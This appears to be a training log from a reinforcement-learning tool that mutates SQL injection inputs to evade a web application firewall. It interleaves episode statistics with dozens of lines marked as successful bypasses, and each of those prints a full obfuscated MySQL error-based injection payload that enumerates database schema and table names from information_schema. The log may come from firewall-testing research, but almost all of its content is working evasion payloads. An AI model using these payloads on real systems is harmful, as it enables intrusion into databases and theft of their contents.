+  [BYPASS] Ep 8647 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SeLect%0d%0a*%0d%0afrOm%0d%0a(SElECt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aINfOrMAtiON_SCHeMa.schemata))
+  [BYPASS] Ep 8648 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFrom%0d%0a(seLeCt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(ConCAt(TablE_schema,CHAR(46),tabLe_name))%0d%0aFrOM%0d%0a
+  Ep 8650 | SR=20% | Steps=12.9 | R=-23.35
+  Ep 8660 | SR=0% | Steps=15.0 | R=-32.38
+  [BYPASS] Ep 8663 | steps=4 | seq=null_byte -> crlf -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((datAbAse%a0()),1);%00
+  Ep 8670 | SR=10% | Steps=13.9 | R=-27.96
+  [BYPASS] Ep 8672 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(selecT%0d%0a*%0d%0aFROm%0d%0a(seLEcT%0d%0a((SELEcT%0d%0aJSON_ARRAYAGG(COncAT(tABLE_schema,CHAR(46),tablE_name))%0d%0aFRoM%0d%0a
+  [BYPASS] Ep 8676 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seLEcT%0d%0a*%0d%0aFrOM%0d%0a(SeleCt%0d%0a((selEct%0d%0aJSON_ARRAYAGG(concaT(tablE_schema,CHAR(46),table_name))%0d%0afRom%0d%0a
+  Ep 8680 | SR=20% | Steps=13.0 | R=-23.55
+  Ep 8690 | SR=0% | Steps=15.0 | R=-35.34
+  [BYPASS] Ep 8695 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afrom%0d%0a(SElect%0d%0a((sELect%0d%0aJSON_ARRAYAGG(coNcaT(TABlE_schema,CHAR(46),TAbLE_name))%0d%0aFRoM%0d%0a
+  Ep 8700 | SR=10% | Steps=14.0 | R=-31.28
+  [BYPASS] Ep 8707 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(seLecT%0d%0a*%0d%0aFrOm%0d%0a(seLect%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(CoNCaT(TAbLE_schema,CHAR(46),TABLE_name))%0d%0afROM%0d%0a
+  Ep 8710 | SR=10% | Steps=14.0 | R=-30.88
+  Ep 8720 | SR=0% | Steps=15.0 | R=-33.99
+  [BYPASS] Ep 8727 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeLect%0d%0a*%0d%0aFROm%0d%0a(sElect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(conCaT(table_schema,CHAR(46),TAbLE_name))%0d%0afRoM%0d%0a
+  Ep 8730 | SR=10% | Steps=14.0 | R=-31.11
+  [BYPASS] Ep 8735 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFRom%0d%0a(sElECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aInFoRmAtiOn_schema.schemata))
+  Ep 8740 | SR=10% | Steps=13.9 | R=-27.80
+  [BYPASS] Ep 8747 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0afRoM%0d%0a(seLECt%0d%0a((selECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aInfOrMAtION_scHeMa.schemata))
+  Ep 8750 | SR=10% | Steps=13.9 | R=-29.84
+  Ep 8760 | SR=0% | Steps=15.0 | R=-35.57
+  [BYPASS] Ep 8766 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(seLEcT%0d%0a*%0d%0aFrOm%0d%0a(SElECt%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(coNCAT(TAbLE_schema,CHAR(46),taBLE_name))%0d%0aFrOM%0d%0a
+  [BYPASS] Ep 8769 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SeLEcT%0d%0a*%0d%0aFROm%0d%0a(sELeCt%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(coNCaT(TABlE_schema,CHAR(46),Table_name))%0d%0aFrOM%0d%0a
+  Ep 8770 | SR=20% | Steps=13.0 | R=-26.49
+  Ep 8780 | SR=0% | Steps=15.0 | R=-34.83
+  [BYPASS] Ep 8786 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(sELect%0d%0a*%0d%0afROM%0d%0a(SeLeCt%0d%0a((seLeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0aiNFormaTIoN_sCHEMA.schemata))
+  Ep 8790 | SR=10% | Steps=13.9 | R=-29.36
+  [BYPASS] Ep 8793 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFroM%0d%0a(selECT%0d%0a((seLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aINFoRMation_SCheMa.schemata))
+  Ep 8800 | SR=10% | Steps=13.9 | R=-31.38
+  Ep 8810 | SR=0% | Steps=15.0 | R=-35.95
+  Ep 8820 | SR=0% | Steps=15.0 | R=-35.29
+  Ep 8830 | SR=0% | Steps=15.0 | R=-35.43
+  Ep 8840 | SR=0% | Steps=15.0 | R=-35.52
+  [BYPASS] Ep 8849 | steps=6 | seq=agg_swap -> case -> agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seLeCT%0d%0a*%0d%0afroM%0d%0a(seleCT%0d%0a((SELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfOrmAtIon_sCheMa.schemata))
+  Ep 8850 | SR=10% | Steps=14.1 | R=-32.30
+  Ep 8860 | SR=0% | Steps=15.0 | R=-36.05
+  [BYPASS] Ep 8867 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFrOm%0d%0a(sElECt%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(ConCat(tABle_schema,CHAR(46),tAblE_name))%0d%0afrOm%0d%0a
+  Ep 8870 | SR=10% | Steps=14.0 | R=-29.30
+  Ep 8880 | SR=0% | Steps=15.0 | R=-31.53
+  Ep 8890 | SR=0% | Steps=15.0 | R=-34.81
+  Ep 8900 | SR=0% | Steps=15.0 | R=-35.44
+  [BYPASS] Ep 8908 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeleCT%0d%0a*%0d%0aFROM%0d%0a(SEleCt%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainFOrmATioN_ScHEmA.schemata))
+  [BYPASS] Ep 8910 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(seLecT%0d%0a*%0d%0aFrom%0d%0a(SEleCt%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0ainFORMAtion_sCHEma.schemata))
+  Ep 8910 | SR=20% | Steps=12.8 | R=-25.71
+  Ep 8920 | SR=0% | Steps=15.0 | R=-35.12
+  [BYPASS] Ep 8921 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLECT%0d%0a*%0d%0aFrom%0d%0a(SeLecT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aInFORMAtioN_sCHemA.schemata))
+  [BYPASS] Ep 8926 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> func_sp_nl -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELECT%0d%0a*%0d%0afROM%0d%0a(seLeCT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(cOncaT(tABLE_schema,CHAR(46),tAble_name))%0d%0afroM%0d%0a
+  Ep 8930 | SR=20% | Steps=13.0 | R=-26.88
+  [BYPASS] Ep 8940 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeLEct%0d%0a*%0d%0afRoM%0d%0a(sElECT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINFoRmATIoN_SchEMa.schemata))
+  Ep 8940 | SR=10% | Steps=13.9 | R=-30.61
+  Ep 8950 | SR=0% | Steps=15.0 | R=-32.24
+  Ep 8960 | SR=0% | Steps=15.0 | R=-35.28
+  Ep 8970 | SR=0% | Steps=15.0 | R=-33.13
+  [BYPASS] Ep 8975 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOm%0d%0a(SeleCT%0d%0a((selEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainfORmation_schemA.schemata))
+  [BYPASS] Ep 8978 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sElecT%0d%0a*%0d%0aFROm%0d%0a(SelECt%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aInForMATION_SCHeMa.schemata))
+  Ep 8980 | SR=20% | Steps=12.8 | R=-23.38
+  Ep 8990 | SR=0% | Steps=15.0 | R=-35.42
+  Ep 9000 | SR=0% | Steps=15.0 | R=-33.64
+  Ep 9010 | SR=0% | Steps=15.0 | R=-35.91
+  Ep 9020 | SR=0% | Steps=15.0 | R=-33.56
+  Ep 9030 | SR=0% | Steps=15.0 | R=-33.32
+  [BYPASS] Ep 9038 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SEleCT%0d%0a*%0d%0afrom%0d%0a(sElecT%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aiNFORMAtiOn_sCheMa.schemata))
+  [BYPASS] Ep 9040 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sEleCt%0d%0a*%0d%0aFRoM%0d%0a(SELeCt%0d%0a((seLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInfoRmATioN_schemA.schemata))
+  Ep 9040 | SR=20% | Steps=12.8 | R=-24.04
+  Ep 9050 | SR=0% | Steps=15.0 | R=-34.22
+  Ep 9060 | SR=0% | Steps=15.0 | R=-35.01
+  Ep 9070 | SR=0% | Steps=15.0 | R=-34.15
+  Ep 9080 | SR=0% | Steps=15.0 | R=-34.21
+  [BYPASS] Ep 9084 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SeLect%0d%0a*%0d%0aFroM%0d%0a(selECt%0d%0a((sElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aINfOrMAtiOn_SCHema.schemata))
+  Ep 9090 | SR=10% | Steps=13.9 | R=-29.54
+  [BYPASS] Ep 9092 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(selecT%0d%0a*%0d%0afRom%0d%0a(selEcT%0d%0a((selECt%0d%0aJSON_ARRAYAGG(coNCaT(TAble_schema,CHAR(46),tablE_name))%0d%0afrOM%0d%0a
+  [BYPASS] Ep 9096 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFROm%0d%0a(sELECT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(cOncat(TaBLE_schema,CHAR(46),TAble_name))%0d%0aFroM%0d%0a
+  Ep 9100 | SR=20% | Steps=13.0 | R=-25.24
+  [BYPASS] Ep 9104 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFrOm%0d%0a(SelEct%0d%0a((sELEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aInfoRmaTIon_ScHEmA.schemata))
+  Ep 9110 | SR=10% | Steps=13.9 | R=-29.42
+  [BYPASS] Ep 9115 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(SElEct%0d%0a*%0d%0aFROM%0d%0a(selEcT%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(coNCAT(tAbLe_schema,CHAR(46),tAbLe_name))%0d%0afROm%0d%0a
+  Ep 9120 | SR=10% | Steps=14.0 | R=-31.12
+  [BYPASS] Ep 9130 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SELEcT%0d%0a*%0d%0aFrom%0d%0a(SeLECT%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINFOrmaTion_SChemA.schemata))
+  Ep 9130 | SR=10% | Steps=13.9 | R=-30.74
+  Ep 9140 | SR=0% | Steps=15.0 | R=-33.34
+  Ep 9150 | SR=0% | Steps=15.0 | R=-34.90
+  [BYPASS] Ep 9153 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(seLECt%0d%0a*%0d%0aFRoM%0d%0a(seLect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0aiNFOrmAtION_SchEma.schemata))
+  Ep 9160 | SR=10% | Steps=13.9 | R=-30.85
+  [BYPASS] Ep 9166 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SElEct%0d%0a*%0d%0aFrOm%0d%0a(sELEcT%0d%0a((SELeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aiNfORmaTiOn_SChEma.schemata))
+  Ep 9170 | SR=10% | Steps=13.9 | R=-28.87
+  Ep 9180 | SR=0% | Steps=15.0 | R=-32.49
+  [BYPASS] Ep 9189 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SELEct%0d%0a*%0d%0afrOM%0d%0a(selECt%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aiNFoRMAtIon_scHema.schemata))
+  Ep 9190 | SR=10% | Steps=13.9 | R=-28.83
+  [BYPASS] Ep 9197 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFRoM%0d%0a(seLect%0d%0a((SELeCT%0d%0aJSON_ARRAYAGG(conCat(TabLe_schema,CHAR(46),taBLE_name))%0d%0afRoM%0d%0a
+  Ep 9200 | SR=10% | Steps=14.0 | R=-30.47
+  Ep 9210 | SR=0% | Steps=15.0 | R=-34.88
+  Ep 9220 | SR=0% | Steps=15.0 | R=-33.16
+  [BYPASS] Ep 9221 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SElecT%0d%0a*%0d%0aFROM%0d%0a(SeLEcT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(cONcAT(tABLe_schema,CHAR(46),TabLe_name))%0d%0afrOM%0d%0a
+  Ep 9230 | SR=10% | Steps=14.0 | R=-26.52
+  Ep 9240 | SR=0% | Steps=15.0 | R=-35.21
+  Ep 9250 | SR=0% | Steps=15.0 | R=-34.69
+  [BYPASS] Ep 9256 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(sEleCT%0d%0a*%0d%0afRom%0d%0a(seLeCt%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(coNCaT(Table_schema,CHAR(46),tABlE_name))%0d%0aFRom%0d%0a
+  Ep 9260 | SR=10% | Steps=14.0 | R=-29.17
+  [BYPASS] Ep 9268 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(selECt%0d%0a*%0d%0aFrOm%0d%0a(sELeCT%0d%0a((SelECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfORmatIon_sChemA.schemata))
+  Ep 9270 | SR=10% | Steps=13.9 | R=-28.98
+  Ep 9280 | SR=0% | Steps=15.0 | R=-35.56
+  [BYPASS] Ep 9285 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seleCT%0d%0a*%0d%0afrOm%0d%0a(SELEcT%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0aINfOrmaTion_SCHEmA.schemata))
+  [BYPASS] Ep 9290 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0afROM%0d%0a(seLeCt%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aInFoRmAtioN_schemA.schemata))
+  Ep 9290 | SR=20% | Steps=12.8 | R=-25.21
+  Ep 9300 | SR=0% | Steps=15.0 | R=-35.03
+  [BYPASS] Ep 9305 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLecT%0d%0a*%0d%0aFrOm%0d%0a(SeleCT%0d%0a((sELecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aiNFoRmATiON_ScHemA.schemata))
+  [BYPASS] Ep 9309 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(seLECt%0d%0a*%0d%0aFrom%0d%0a(SelECT%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0ainFormaTIon_sCHema.schemata))
+  Ep 9310 | SR=20% | Steps=12.8 | R=-26.20
+  Ep 9320 | SR=0% | Steps=15.0 | R=-34.77
+  [BYPASS] Ep 9325 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0aFROM%0d%0a(SeLECt%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINFORMAtioN_sCHEmA.schemata))
+  Ep 9330 | SR=10% | Steps=13.9 | R=-30.69
+  Ep 9340 | SR=0% | Steps=15.0 | R=-35.01
+  Ep 9350 | SR=0% | Steps=15.0 | R=-33.45
+  Ep 9360 | SR=0% | Steps=15.0 | R=-33.75
+  [BYPASS] Ep 9361 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sEleCt%0d%0a*%0d%0afrOM%0d%0a(sELEct%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(cOncAt(TaBLe_schema,CHAR(46),TAblE_name))%0d%0afRom%0d%0a
+  Ep 9370 | SR=10% | Steps=14.0 | R=-30.32
+  Ep 9380 | SR=0% | Steps=15.0 | R=-34.44
+  Ep 9390 | SR=0% | Steps=15.0 | R=-30.82
+  Ep 9400 | SR=0% | Steps=15.0 | R=-35.01
+  Ep 9410 | SR=0% | Steps=15.0 | R=-35.13
+  Ep 9420 | SR=0% | Steps=15.0 | R=-33.12
+  [BYPASS] Ep 9422 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFROm%0d%0a(seLect%0d%0a((selEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aINformAtIoN_SchEma.schemata))
+  Ep 9430 | SR=10% | Steps=13.9 | R=-29.56
+  [BYPASS] Ep 9439 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SELeCT%0d%0a*%0d%0afrOM%0d%0a(SeLecT%0d%0a((SeLeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aiNfOrMatiON_SCHEma.schemata))
+  Ep 9440 | SR=10% | Steps=13.9 | R=-29.20
+  Ep 9450 | SR=0% | Steps=15.0 | R=-35.48
+  Ep 9460 | SR=0% | Steps=15.0 | R=-32.43
+  [BYPASS] Ep 9463 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SELeCt%0d%0a*%0d%0afrOm%0d%0a(SElect%0d%0a((SElect%0d%0aJSON_ARRAYAGG(COnCat(TAblE_schema,CHAR(46),TAblE_name))%0d%0aFroM%0d%0a
+  [BYPASS] Ep 9464 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SelecT%0d%0a*%0d%0afRom%0d%0a(sEleCT%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(COnCAt(TablE_schema,CHAR(46),TabLE_name))%0d%0afRom%0d%0a
+  Ep 9470 | SR=20% | Steps=13.0 | R=-25.40
+  Ep 9480 | SR=0% | Steps=15.0 | R=-34.80
+  Ep 9490 | SR=0% | Steps=15.0 | R=-35.28
+  Ep 9500 | SR=0% | Steps=15.0 | R=-35.22
+  [BYPASS] Ep 9503 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SelECT%0d%0a*%0d%0aFROM%0d%0a(seleCT%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0ainfOrMaTiOn_Schema.schemata))
+  Ep 9510 | SR=10% | Steps=13.9 | R=-28.10
+  Ep 9520 | SR=0% | Steps=15.0 | R=-31.64
+  Ep 9530 | SR=0% | Steps=15.0 | R=-35.51
+  Ep 9540 | SR=0% | Steps=15.0 | R=-35.05
+  Ep 9550 | SR=0% | Steps=15.0 | R=-33.94
+  Ep 9560 | SR=0% | Steps=15.0 | R=-34.91
+  Ep 9570 | SR=0% | Steps=15.0 | R=-34.94
+  Ep 9580 | SR=0% | Steps=15.0 | R=-35.05
+  [BYPASS] Ep 9589 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sELect%0d%0a*%0d%0afRom%0d%0a(sEleCt%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(ConcAt(tAble_schema,CHAR(46),TabLe_name))%0d%0afROM%0d%0a
+  Ep 9590 | SR=10% | Steps=14.0 | R=-29.17
+  [BYPASS] Ep 9597 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(selECT%0d%0a*%0d%0afrOM%0d%0a(SelECt%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0aiNfOrmAtIOn_sCHemA.schemata))
+  Ep 9600 | SR=10% | Steps=13.9 | R=-27.86
+  Ep 9610 | SR=0% | Steps=15.0 | R=-33.69
+  Ep 9620 | SR=0% | Steps=15.0 | R=-35.27
+  Ep 9630 | SR=0% | Steps=15.0 | R=-34.59
+  [BYPASS] Ep 9634 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(seLEct%0d%0a*%0d%0aFRom%0d%0a(sELecT%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNfOrMaTioN_SchEmA.schemata))
+  Ep 9640 | SR=10% | Steps=13.9 | R=-30.73
+  Ep 9650 | SR=0% | Steps=15.0 | R=-35.74
+  Ep 9660 | SR=0% | Steps=15.0 | R=-33.28
+  Ep 9670 | SR=0% | Steps=15.0 | R=-35.55
+  Ep 9680 | SR=0% | Steps=15.0 | R=-34.61
+  Ep 9690 | SR=0% | Steps=15.0 | R=-33.20
+  [BYPASS] Ep 9695 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(selEct%0d%0a*%0d%0aFrOm%0d%0a(SElEct%0d%0a((SElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aInfoRmAtiON_scHeMa.schemata))
+  [BYPASS] Ep 9696 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelEcT%0d%0a*%0d%0aFrOm%0d%0a(SELEct%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aInfOrmATIoN_sCheMa.schemata))
+  Ep 9700 | SR=20% | Steps=12.8 | R=-25.02
+  [BYPASS] Ep 9707 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(seLEcT%0d%0a*%0d%0aFrOm%0d%0a(sElEct%0d%0a((seLECT%0d%0aJSON_ARRAYAGG(COnCat(TABlE_schema,CHAR(46),tabLe_name))%0d%0afROM%0d%0a
+  Ep 9710 | SR=10% | Steps=14.0 | R=-29.40
+  Ep 9720 | SR=0% | Steps=15.0 | R=-32.92
+  Ep 9730 | SR=0% | Steps=15.0 | R=-33.99
+  Ep 9740 | SR=0% | Steps=15.0 | R=-33.31
+  [BYPASS] Ep 9748 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFROM%0d%0a(seLEcT%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(CoNCaT(tAble_schema,CHAR(46),TaBLe_name))%0d%0afrOM%0d%0a
+  Ep 9750 | SR=10% | Steps=14.0 | R=-29.66
+  [BYPASS] Ep 9753 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEct%0d%0a*%0d%0aFRoM%0d%0a(SeLEcT%0d%0a((seLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afroM%0d%0aINFoRmATIOn_SCHema.schemata))
+  Ep 9760 | SR=10% | Steps=13.9 | R=-30.57
+  [BYPASS] Ep 9764 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selECT%0d%0a*%0d%0aFRoM%0d%0a(seleCt%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aiNfOrMaTIOn_sChema.schemata))
+  [BYPASS] Ep 9766 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFROm%0d%0a(SelECt%0d%0a((selECt%0d%0aJSON_ARRAYAGG(coNCAT(TAblE_schema,CHAR(46),tAbLe_name))%0d%0aFROm%0d%0a
+  Ep 9770 | SR=20% | Steps=12.9 | R=-25.05
+  Ep 9780 | SR=0% | Steps=15.0 | R=-35.40
+  Ep 9790 | SR=0% | Steps=15.0 | R=-32.31
+  [BYPASS] Ep 9797 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElect%0d%0a*%0d%0afroM%0d%0a(SElECT%0d%0a((sELEct%0d%0aJSON_ARRAYAGG(cOncat(TaBLE_schema,CHAR(46),tABLe_name))%0d%0afROM%0d%0a
+  Ep 9800 | SR=10% | Steps=14.0 | R=-30.43
+  [BYPASS] Ep 9806 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SelECt%0d%0a*%0d%0aFroM%0d%0a(selECt%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(CoNcaT(Table_schema,CHAR(46),tABLE_name))%0d%0aFrOm%0d%0a
+  Ep 9810 | SR=10% | Steps=14.0 | R=-27.26
+  Ep 9820 | SR=0% | Steps=15.0 | R=-33.85
+  Ep 9830 | SR=0% | Steps=15.0 | R=-34.69
+  [BYPASS] Ep 9838 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0aFroM%0d%0a(SElECT%0d%0a((SelECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0ainfORmaTiOn_sChEMa.schemata))
+  Ep 9840 | SR=10% | Steps=13.9 | R=-27.52
